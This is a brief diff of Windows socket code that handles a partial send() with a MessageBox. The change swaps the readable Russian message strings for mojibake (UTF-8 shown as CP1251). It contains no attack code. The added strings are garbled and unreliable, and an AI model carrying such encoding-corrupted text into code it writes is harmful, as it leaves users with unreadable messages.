 else if (iSend != SOCKET_ERROR && iSend < PACKET_SIZE)
 {
-MessageBox(NULL, "Send отправила часть данных", "Этого не должно быть", MB_OK);
+MessageBox(NULL, "Send РѕС‚РїСЂР°РІРёР»Р° С‡Р°СЃС‚СЊ РґР°РЅРЅС‹С…", "Р­С‚РѕРіРѕ РЅРµ РґРѕР»Р¶РЅРѕ Р±С‹С‚СЊ", MB_OK);
 }
 else
 {
